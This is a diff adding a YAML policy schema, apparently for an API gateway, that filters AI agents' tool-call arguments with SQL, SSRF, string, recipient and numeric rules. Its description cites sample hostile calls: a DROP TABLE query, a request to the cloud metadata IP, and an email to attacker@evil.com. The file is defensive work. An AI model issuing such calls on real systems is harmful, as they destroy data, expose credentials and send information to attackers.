@@ -1,0 +1,143 @@
+name: semantic-tool-call-firewall
+version: v0.1.0
+description: |
+  Enforce OPERATION-level boundaries on agent tool calls (OWASP LLM06 Excessive
+  Agency, Agentic ASI02 Tool Misuse, T2/T3). Endpoint auth answers "may this
+  agent call run_sql?" - it does not stop `run_sql("DROP TABLE users")`,
+  `http_request("http://169.254.169.254/latest/meta-data/")`, or
+  `send_email(to="attacker@evil.com")`. This policy inspects the tool call's
+  ARGUMENTS against per-tool rules on the request, before it reaches the tool.
+
+  Works on the MCP `tools/call` request by default (tool name at
+  `$.params.name`, arguments object at `$.params.arguments`); point
+  `toolNameJsonPath` / `argumentsJsonPath` elsewhere for other shapes.
+
+  Rule kinds (any combination per tool):
+    - sql        : allow/deny by leading SQL statement type; block stacked
+                   statements; require WHERE on UPDATE/DELETE
+    - url        : SSRF guard on URL arguments - scheme allowlist, reject
+                   private/loopback/link-local/metadata IP literals and embedded
+                   userinfo, optional host allow/deny (static parse; no DNS)
+    - strings    : per-argument max length, deny regexes, required allow regex
+    - recipients : email / webhook recipient domain allowlist
+    - numbers    : per-argument min / max (e.g. refund ceilings)
+
+  A tool with no matching rule follows `defaultAction` (allow by default).
+  On violation: block (HTTP 422, with a JSON-RPC-shaped error when the request
+  is JSON-RPC) or annotate (x-tool-firewall-* headers + analytics, forwarded).
+
+parameters:
+  type: object
+  properties:
+    toolNameJsonPath:
+      type: string
+      x-wso2-policy-advanced-param: true
+      default: "$.params.name"
+    argumentsJsonPath:
+      type: string
+      x-wso2-policy-advanced-param: true
+      default: "$.params.arguments"
+    onViolation:
+      type: string
+      enum: [block, annotate]
+      x-wso2-policy-advanced-param: false
+      default: block
+    defaultAction:
+      type: string
+      enum: [allow, block]
+      x-wso2-policy-advanced-param: false
+      description: What to do with a tool call whose tool name matches no rule.
+      default: allow
+    showAssessment:
+      type: boolean
+      x-wso2-policy-advanced-param: true
+      default: false
+    passthroughOnError:
+      type: boolean
+      x-wso2-policy-advanced-param: true
+      description: Forward the request if the policy cannot parse it (not JSON, missing tool name, etc.).
+      default: false
+    rules:
+      type: array
+      x-wso2-policy-advanced-param: false
+      description: Per-tool argument rules. First rule whose toolName matches (exact, then glob) applies.
+      items:
+        type: object
+        required: [toolName]
+        properties:
+          toolName:
+            type: string
+            description: Exact tool name, or a glob such as "db_*" or "*".
+          sql:
+            type: object
+            properties:
+              argPath: { type: string, default: "$.query" }
+              allowStatements:
+                type: array
+                items: { type: string }
+                default: [SELECT, WITH, EXPLAIN, SHOW, DESCRIBE]
+              denyStatements:
+                type: array
+                items: { type: string }
+                description: If non-empty, deny-list mode - anything not listed is allowed.
+                default: []
+              blockMultipleStatements: { type: boolean, default: true }
+              requireWhereForUpdateDelete: { type: boolean, default: true }
+          url:
+            type: object
+            properties:
+              argPaths:
+                type: array
+                items: { type: string }
+                default: ["$.url", "$.endpoint", "$.uri"]
+              allowedSchemes:
+                type: array
+                items: { type: string }
+                default: [https]
+              blockPrivateNetworks: { type: boolean, default: true }
+              allowHosts:
+                type: array
+                items: { type: string }
+                default: []
+              denyHosts:
+                type: array
+                items: { type: string }
+                default: []
+          strings:
+            type: array
+            items:
+              type: object
+              required: [argPath]
+              properties:
+                argPath: { type: string }
+                maxLength: { type: integer, minimum: 1 }
+                denyPatterns:
+                  type: array
+                  items: { type: string }
+                  default: []
+                allowPattern: { type: string, default: "" }
+          recipients:
+            type: object
+            properties:
+              argPaths:
+                type: array
+                items: { type: string }
+                default: ["$.to", "$.recipient", "$.recipients"]
+              allowDomains:
+                type: array
+                items: { type: string }
+                default: []
+          numbers:
+            type: array
+            items:
+              type: object
+              required: [argPath]
+              properties:
+                argPath: { type: string }
+                min: { type: number }
+                max: { type: number }
+
+systemParameters:
+  type: object
+  additionalProperties: false
+  properties: {}
